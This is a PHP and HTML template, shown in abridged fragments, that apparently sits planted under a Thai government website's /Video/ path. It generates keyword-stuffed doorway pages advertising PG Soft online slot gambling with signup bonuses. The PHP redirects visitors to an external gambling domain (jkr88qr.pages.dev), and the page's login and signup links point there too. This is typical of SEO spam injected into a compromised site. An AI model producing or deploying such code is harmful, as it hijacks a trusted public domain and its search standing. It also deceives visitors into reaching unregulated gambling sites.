<?php
    $domainUrl = 'https://www.takpeo.go.th/Video/';
    $cache = false;
    $useHtaccess = false;

    // Mengambil domain dari URL (Pastikan ada skema)
    $domainParse = parse_url('https://' . $domainUrl);
    $host = isset($domainParse['host']) ? $domainParse['host'] : 'https://www.takpeo.go.th/Video/';
    $domain = isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : '';
    $params = 'list';
    $registerUrl = 'https://jkr88qr.pages.dev';
...
if (!hwdproperties()) 
{
     ...
     header("Location: https://jkr88qr.pages.dev");
     exit();
}
    ...
    if (!empty($params)) {
        ...
        if (isset($_GET[$sorry]) && !empty($_GET[$sorry])) {
            ...
            $url = "https://www.takpeo.go.th/Video/?list=" . $query_encode;
...
<html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="th-TH"><head>
    ...
    <title><?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที</title>
    <meta name="description" content="<?php echo $pg ?> คือลิงก์สล็อต PG Soft ยอดนิยมปี 2025 ไม่ผ่านเอเย่นต์ มาพร้อมฟีเจอร์ใหม่ล่าสุด เช่น แจ็คพอตแตกทันที ฝากถอนอัตโนมัติไม่มีค่าธรรมเนียม รับโบนัสสมาชิกใหม่ 100% ได้เลยตอนนี้ ห้ามพลาด"/>
    <meta name="og:url" content="<?php echo $baseUrl; ?>"/>
    <meta name="og:title" content="<?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที"/>
    <meta name="og:type" content="product"/>
    <meta name="og:description" content="<?php echo $pg ?> คือลิงก์สล็อต PG Soft ยอดนิยมปี 2025 ไม่ผ่านเอเย่นต์ มาพร้อมฟีเจอร์ใหม่ล่าสุด เช่น แจ็คพอตแตกทันที ฝากถอนอัตโนมัติไม่มีค่าธรรมเนียม รับโบนัสสมาชิกใหม่ 100% ได้เลยตอนนี้ ห้ามพลาด"/>
    <meta name="og:image" content="https://res.cloudinary.com/dxw3rnd2v/v1747834694/thaigo/image4.jpg"/>
    ...
    <script type="application/ld+json">
            {
                ...
                "@type": "Organization",
                "name": "<?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที",
                ...
                "description": "<?php echo $pg ?> คือลิงก์สล็อต PG Soft ยอดนิยมปี 2025 ไม่ผ่านเอเย่นต์ มาพร้อมฟีเจอร์ใหม่ล่าสุด เช่น แจ็คพอตแตกทันที ฝากถอนอัตโนมัติไม่มีค่าธรรมเนียม รับโบนัสสมาชิกใหม่ 100% ได้เลยตอนนี้ ห้ามพลาด",
                "address": {
                    "@type": "PostalAddress",
        ...
        <script type="application/ld+json">
            {
                ...
                "headline": "<?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที",
                "description": "<?php echo $pg ?> คือลิงก์สล็อต PG Soft ยอดนิยมปี 2025 ไม่ผ่านเอเย่นต์ มาพร้อมฟีเจอร์ใหม่ล่าสุด เช่น แจ็คพอตแตกทันที ฝากถอนอัตโนมัติไม่มีค่าธรรมเนียม รับโบนัสสมาชิกใหม่ 100% ได้เลยตอนนี้ ห้ามพลาด",
                "image": ["https://res.cloudinary.com/dxw3rnd2v/v1747834694/thaigo/image4.jpg"],
                "author": { "@type": "Person", "name": "<?php echo $host; ?>", "url": "<?php echo $domainUrl; ?>" },
                "publisher": { "@type": "Organization", "name": "<?php echo $host; ?>", "logo": { "@type": "ImageObject", "url": "https://res.cloudinary.com/dxw3rnd2v/v1747834694/thaigo/image4.jpg" } },
        ...
        <script type="application/ld+json" data-rh="true">
            {
                ...
                "itemListElement": [
                    ...
                    { "@type": "ListItem", "position": 5, "item": { "@id": "<?php echo $baseUrl; ?>", "name": "<?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที" } }
                ]
            }
            </script>
...
<div class="top-links-item" id="anonLogin">
    <a href="https://jkr88qr.pages.dev" rel="nofollow" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5" style="color: #000000;">เข้าสู่ระบบ <?php echo $pg ?></a>
</div>
<div class="top-links-item grey" id="anonSignup">
    <a href="https://jkr88qr.pages.dev" rel="nofollow" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6" style="color: #000000;">รายการ <?php echo $pg ?></a>
</div>
            ...
            <div>
                ...
                <div data-spm="breadcrumb" id="J_breadcrumb_list" class="breadcrumb_list">
                    <ul class="breadcrumb" id="J_breadcrumb">
                        ...
                        <li class="breadcrumb_item">
                            <span class="breadcrumb_item_text">
                                <span class="breadcrumb_item_anchor breadcrumb_item_anchor_last"><?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที</span>
                            </span>
                        </li>
                    </ul>
                </div>
                    ...
                    <div class="item-gallery" data-spm="gallery">
                        <div class="gallery-preview-panel">
                            <div class="gallery-preview-panel__content">
                                <img class="pdp-mod-common-image gallery-preview-panel__image" src="https://res.cloudinary.com/dxw3rnd2v/v1747834694/thaigo/image4.jpg"/>
                            </div>
                            <p style="text-align: center;">
                                <a href="https://jkr88qr.pages.dev" rel="nofollow">
                                ...
                                <div id="module_product_title_1" class="pdp-block module">
                                    <div class="pdp-product-title">
                                        <div class="pdp-mod-product-badge-wrapper">
                                            <h1 class="pdp-mod-product-badge-title"><?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที</h1>
                        ...
                        <div id="module_product_price_1" class="pdp-block module">
                            <div class="pdp-mod-product-price">
                                <div class="site-description">
                                    ...
                                    <h1 style="text-align: center;"><?php echo $pg ?> : 🔥 ลิงก์ตรงสล็อต PG Soft มาแรงปี 2025 เล่นได้เลยไม่ผ่านเอเย่นต์ ไม่มีค่าธรรมเนียม สมัครใหม่รับโบนัส 100% ทันที</h1>
                                   <p><?php echo $pg ?> คือลิงก์สล็อต PG Soft ยอดนิยมปี 2025 ไม่ผ่านเอเย่นต์ มาพร้อมฟีเจอร์ใหม่ล่าสุด เช่น แจ็คพอตแตกทันที ฝากถอนอัตโนมัติไม่มีค่าธรรมเนียม รับโบนัสสมาชิกใหม่ 100% ได้เลยตอนนี้ ห้ามพลาด</p>
